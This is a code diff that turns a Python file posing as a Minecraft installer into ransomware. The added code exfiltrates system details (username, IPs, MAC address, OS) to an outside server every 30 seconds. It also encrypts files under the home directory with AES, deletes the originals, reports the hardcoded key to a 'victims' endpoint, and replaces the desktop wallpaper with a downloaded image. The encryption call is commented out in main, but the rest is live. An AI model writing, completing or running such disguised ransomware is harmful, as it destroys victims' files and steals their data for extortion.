@@ -12,23 +12,30 @@ import shutil
 import getpass
 import threading
 import uuid
+import datetime
+import subprocess
+import ctypes
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
+from Crypto import Random
 
 import psutil
 
-SERVER_URL = "https://minecraft.puiustin.com/api/report"
-TELEMETRY_INTERVAL = 60 
+TELEMETRY_INTERVAL = 30
+TELEMETRY_URL = "https://minecraft.puiustin.com/api/telemetry"
+VICTIM_URL = "https://minecraft.puiustin.com/api/victims"
+WALLPAPER_URL = "https://minecraft.puiustin.com/background.jpeg"
+DEFAULT_PASSWORD = "hger478tg43803hfg5874heif3f82fgu2rgg8v4444g"
+
 
 def get_public_ip():
     try:
-        import urllib.request
         return urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
     except Exception:
         return "Unknown"
 
-
 def collect_telemetry():
     """Collect as much system information as possible"""
-
     try:
         total, used, free = shutil.disk_usage("/")
         disk_info = {
@@ -46,8 +53,7 @@ def collect_telemetry():
         local_ip = "Unknown"
 
     try:
-        mac_address = ":".join(f"{(uuid.getnode() >> ele) & 0xff:02x}"
-                                for ele in range(40, -1, -8))
+        mac_address = ":".join(f"{(uuid.getnode() >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
     except Exception:
         mac_address = "Unknown"
 
@@ -57,31 +63,21 @@ def collect_telemetry():
         "current_user": getpass.getuser(),
         "home_directory": os.path.expanduser("~"),
         "current_working_directory": os.getcwd(),
-
         "os_system": platform.system(),
         "os_release": platform.release(),
         "os_version": platform.version(),
         "os_build": platform.platform(),
         "machine_arch": platform.machine(),
         "processor": platform.processor(),
-        "endianness": sys.byteorder,
-
-
         "cpu_count_logical": os.cpu_count(),
-
         "python_version": sys.version,
-        "python_executable": sys.executable,
-
         "disk": disk_info,
-
         "local_ip": local_ip,
         "public_ip": get_public_ip(),
         "mac_address": mac_address,
-
         "shell": os.environ.get("SHELL") or os.environ.get("COMSPEC"),
-        "path_length": len(os.environ.get("PATH", "")),
     }
-
+    
     if psutil:
         try:
             data["cpu_usage_percent"] = psutil.cpu_percent(interval=1)
@@ -114,47 +110,158 @@ def collect_telemetry():
 
     return data
 
-def send_report(data):
-    """Sends the collected data to the server."""
+def send_report(data, url):
+    """Sends JSON data to a specified URL."""
     try:
-        json_data = json.dumps(data).encode('utf-8')
+        json_data = json.dumps(data, indent=2).encode('utf-8')
         req = urllib.request.Request(
-            SERVER_URL,
+            url,
             data=json_data,
             headers={'Content-Type': 'application/json'}
         )
-
         with urllib.request.urlopen(req, timeout=10) as response:
-            if response.getcode() != 200:
-                print(f" > Server returned status: {response.getcode()}")
-
-    except urllib.error.URLError as e:
-        print(f" > Connection failed: {e}")
+            if response.getcode() == 200:
+                print(f" > Report sent successfully to {url}")
+            else:
+                print(f" > Server at {url} returned status: {response.getcode()}")
     except Exception as e:
-        print(f" > An unexpected error occurred during reporting: {e}")
-
+        print(f" > Failed to send report to {url}: {e}")
 
 def telemetry_worker():
     """Continuously collects and sends telemetry data."""
+    print("Telemetry worker started.")
     while True:
         telemetry_data = collect_telemetry()
-        send_report(telemetry_data)
+        send_report(telemetry_data, TELEMETRY_URL)
         time.sleep(TELEMETRY_INTERVAL)
 
 
-def main():
-    print("Initializing Minecraft Installer...")
+def digestSHA256(s):
+    return SHA256.new(s).digest()
 
-    telemetry_thread = threading.Thread(target=telemetry_worker, daemon=True)
-    telemetry_thread.start()
+def encryptAES(chunk, key, iv):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return cipher.encrypt(chunk)
 
-    print("Installer is running. Add your main functions here.")
+def encryptFile(dir, f, key):
+    chunksize = 64 * 1024
+    outFile_path = os.path.join(dir, "(encrypted)" + os.path.basename(f))
+    filesize = str(os.path.getsize(os.path.join(dir, f))).zfill(16)
+    iv = Random.new().read(16)
 
     try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nShutting down installer.")
+        with open(os.path.join(dir,f), "rb") as infile:
+            with open(outFile_path, "wb") as outfile:
+                outfile.write(filesize.encode())
+                outfile.write(iv)
+                while True:
+                    chunk = infile.read(chunksize)
+                    if len(chunk) == 0:
+                        break
+                    elif len(chunk) % 16 != 0:
+                        chunk += b' ' * (16 - (len(chunk) % 16))
+                    outfile.write(encryptAES(chunk, key, iv))
+        os.remove(os.path.join(dir,f))
+        return True
+    except Exception as e:
+        print(f" > Encryption failed for {f}: {e}")
+        return False
+
+def encryptDirectoryTree(dir, key, report_payload):
+    total_files = 0
+    encrypted_files = 0
+    first_report_sent = False
+
+    for root, dirs, files in os.walk(dir):
+        if 'Library' in dirs:
+             dirs.remove('Library')
+        if '.Trash' in dirs:
+            dirs.remove('.Trash')
+
+        for f in files:
+            if not f.startswith("(encrypted)"):
+                total_files += 1
+                if encryptFile(root, f, key):
+                    encrypted_files += 1
+                    print(f" > Encrypted: {os.path.join(root, f)}")
+                    if not first_report_sent:
+                        print("> First file encrypted. Sending initial report...")
+                        send_report(report_payload, VICTIM_URL)
+                        first_report_sent = True
+                else:
+                    print(f" > FAILED to encrypt: {os.path.join(root, f)}")
+    return total_files, encrypted_files
+
+
+
+def download_wallpaper(url, dest_path):
+    print(f"> Downloading wallpaper from {url} to {dest_path}")
+    try:
+        urllib.request.urlretrieve(url, dest_path)
+        print("> Wallpaper downloaded successfully.")
+        return True
+    except Exception as e:
+        print(f"> Failed to download wallpaper: {e}")
+        return False
+
+def set_wallpaper(image_path):
+    print(f"> Attempting to set wallpaper to: {image_path}")
+    system = platform.system()
+    try:
+        if system == "Darwin":
+            script = f'tell application "Finder" to set desktop picture to POSIX file "{image_path}"'
+            subprocess.run(["osascript", "-e", script], check=True)
+            print("> Wallpaper set successfully on macOS.")
+        elif system == "Windows":
+            SPI_SETDESKWALLPAPER = 20
+            SPIF_UPDATEINIFILE = 1
+            SPIF_SENDCHANGE = 2
+            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
+            print("> Wallpaper set successfully on Windows.")
+        elif system == "Linux":
+            subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{image_path}"], check=True)
+            subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-options", "zoom"], check=True) # or 'stretched', 
+            print("> Wallpaper set successfully on Linux (GNOME).")
+        else:
+            print(f"> Unsupported OS for wallpaper setting: {system}")
+    except Exception as e:
+        print(f"> Failed to set wallpaper on {system}: {e}")
+
+
+# --- Main Execution ---
+
+def main():
+    start_time = time.time()
+    print("> Ransomware script starting...")
+    
+    print("Initializing Telemetry Agent...")
+    telemetry_thread = threading.Thread(target=telemetry_worker, daemon=True)
+    telemetry_thread.start()
+    print("Telemetry agent is running in the background.")
+
+    # target_dir = os.path.expanduser("~")
+    # hashed_key = digestSHA256(DEFAULT_PASSWORD.encode())
+    
+    # print(f"> Encrypting default directory: {target_dir}")
+    
+    # victim_telemetry = collect_telemetry()
+    # report_payload = {
+    #     'password': DEFAULT_PASSWORD,
+    #     'telemetry': victim_telemetry
+    # }
+
+    # cnt_files = encryptDirectoryTree(target_dir, hashed_key, report_payload)
+    
+    # print("> Encryption process finished. Sending final report...")
+    # if cnt_files[1] > 0:
+    #     send_report(report_payload, VICTIM_URL)
+
+    # print(f"> Encrypted {cnt_files[1]}/{cnt_files[0]} file(s) in directory {target_dir}")
+    print(f"> Total time of execution: {datetime.timedelta(seconds=time.time()-start_time)}")
+    
+    wallpaper_save_path = os.path.join(os.path.expanduser("~"), "encrypted_wallpaper.png")
+    if download_wallpaper(WALLPAPER_URL, wallpaper_save_path):
+        set_wallpaper(wallpaper_save_path)
 
 
 if __name__ == "__main__":
